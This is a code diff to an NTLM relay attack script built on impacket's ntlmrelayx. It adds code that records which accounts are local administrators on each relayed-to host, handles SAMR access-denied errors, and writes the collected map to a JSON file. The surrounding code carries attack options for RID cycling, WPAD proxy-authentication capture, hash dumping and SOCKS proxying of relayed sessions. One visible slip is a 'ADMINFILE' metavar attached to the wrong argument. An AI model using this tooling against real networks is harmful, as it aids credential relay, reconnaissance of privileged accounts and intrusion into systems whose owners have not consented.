@@ -54,10 +54,14 @@ from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, Ta
 from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
 from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS 
 from impacket.smbconnection import SMBConnection
+from impacket.dcerpc.v5.rpcrt import DCERPCException
 from smbclient import MiniImpacketShell
 
 #Define global variables to prevent RID cycling more than once
 ridCycleDone = False
+
+#Define global localAdminMap
+localAdminMap = {}
 
 class SMBAttack(Thread):
     def __init__(self, config, SMBClient, username):
@@ -79,6 +83,16 @@ class SMBAttack(Thread):
 
     def __answer(self, data):
         self.__answerTMP += data
+
+    def __updateAdminMap(self, adminNames):
+        global localAdminMap
+        hostname = self.__SMBConnection.getRemoteHost()
+        for name in adminNames:
+            if name in localAdminMap:
+                localAdminMap[name].append(hostname)
+            else:
+                localAdminMap[name] = [hostname]
+        return
 
     def run(self):
         global ridCycleDone
@@ -114,10 +128,14 @@ class SMBAttack(Thread):
                     if self.config.enumLocalAdmins:
                         logging.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost()))
                         enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
-                        localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
-                        logging.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost()))
-                        for name in localAdminNames:
-                            logging.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost(), name))
+                        try:
+                            localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
+                            self.__updateAdminMap(localAdminNames)
+                            logging.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost()))
+                            for name in localAdminNames:
+                                logging.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost(), name))
+                        except DCERPCException, e:
+                            logging.info("SAMR access denied")
                     
                     if self.config.ridCycle and not ridCycleDone:
                         logging.info("Relayed user doesn't have admin on {}. Performing RID cycling to enumerate domain users".format(self.__SMBConnection.getRemoteHost())) 
@@ -473,7 +491,7 @@ if __name__ == '__main__':
                         help='Launch a SOCKS proxy for the connection relayed')
     parser.add_argument('-wh','--wpad-host', action='store',help='Enable serving a WPAD file for Proxy Authentication attack, '
                                                                    'setting the proxy host to the one supplied.')
-    parser.add_argument('-wa','--wpad-auth-num', action='store',help='Prompt for authentication N times for clients without MS16-077 installed '
+    parser.add_argument('-wa','--wpad-auth-num', action='store',metavar = 'ADMINFILE', help='Prompt for authentication N times for clients without MS16-077 installed '
                                                                    'before serving a WPAD file.')
     parser.add_argument('-6','--ipv6', action='store_true',help='Listen on both IPv6 and IPv4')
 
@@ -486,6 +504,7 @@ if __name__ == '__main__':
                         'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
                                                           'directory).')
     smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempd SAMR lookup to see who is')
+    smboptions.add_argument('-af','--admin-file', action='store', help='Write enumerated local admins to file')
     smboptions.add_argument('--rid-cycle', action='store_true', required=False, help='Perform a RID bruteforce to enumerate domain users after the first succesful relay. Default max RID=4000')
     smboptions.add_argument('--rid-max', action='store', required=False, default=4000, type=int, help='If --rid-cycle is specified, you can override the RID max here. Default: 4000')
 
@@ -622,6 +641,11 @@ if __name__ == '__main__':
 
     for s in threads:
         del s
+
+    if options.admin_file:
+        logging.info("Writing enumerated local admins to {}".format(options.admin_file))
+        with open(options.admin_file, 'w') as fp:
+            fp.write(json.dumps(localAdminMap))
 
     sys.exit(0)
 
